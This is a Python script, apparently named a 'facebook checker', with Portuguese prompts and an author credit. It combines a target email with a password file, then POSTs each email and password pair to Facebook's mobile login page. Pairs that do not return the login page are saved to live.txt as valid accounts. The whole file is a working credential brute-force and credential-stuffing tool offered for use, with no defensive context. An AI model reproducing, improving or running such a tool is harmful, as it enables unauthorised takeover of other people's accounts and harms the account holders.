print("_/ ____\____    ____  ____\_ |__   ____   ____ |  | __ ")
print("\   __\\__  \ _/ ___\/ __ \| __ \ /  _ \ /  _ \|  |/ /)")
print(" |  |   / __ \\  \__\  ___/| \_\ (  <_> |  <_> )    <  ")
print(" |__|  (____  /\___  >___  >___  /\____/ \____/|__|_ \ ")
print("            \/     \/    \/    \/                   \/ ")
print("       .__                   __                        ")
print("  ____ |  |__   ____   ____ |  | __ ___________        ")
print("_/ ___\|  |  \_/ __ \_/ ___\|  |/ // __ \_  __ \       ")
print("\  \___|   Y  \  ___/\  \___|    <\  ___/|  | \/       ")
print(" \___  >___|  /\___  >\___  >__|_ \\___  >__|          ")
print("     \/     \/     \/     \/     \/    \/       ")

print('\n''\n')

import requests as mr

email = input("Email: ")
senhas = input("Arquivo de senhas: ")
senhas = open(senhas, 'r').readlines()
senhas = [senha.replace('\n',"") for senha in senhas]

for senha in senhas:
    print("{}|{}".format(email, senha), file=open("wordlist.txt", "a+"))
print("Sua lista foi salva no arquivo wordlist.txt")
print("Digite o nome do arquivo se deseja iniciar o ataque: ")
separa = '|'
lista = input("")
lista = open(lista, 'r').readlines()
lista = [linha.replace('\n',"") for linha in lista]

print('\n')
print("========== CHECKER INICIADO ==========")
print("==========  CODED BY BRAGA  ==========\n")

for linha in lista:
	dados = linha.split(separa)
	json = {'email' : dados[0], 'pass' : dados[1]}
	r = mr.post("https://mobile.facebook.com/login", data=json).text

	if r.find("<title>Entrar no Facebook | Facebook</title>") == -1:
		print("LOGIN ENCONTRADO ========== Email: {} Senha: {}".format(dados[0], dados[1]))
		print("Live accounts \n Email:" + dados[0] + "| Senha" + dados[1], file=open("live.txt", "a+"))


	else:
		print("SENHA OU EMAIL ERRADO = Email: {} Senha: {}".format(dados[0], dados[1]))

print('\n''\n')
print('\n' "PROGRAMA FINALIZADO, SUAS CONTAS VÁLIDAS FORAM SALVAS EM live.txt")
print("OBRIGADO POR ULTILIZAR MEU PROGRAMA")
print("CODED BY BRAGA")
	
input()

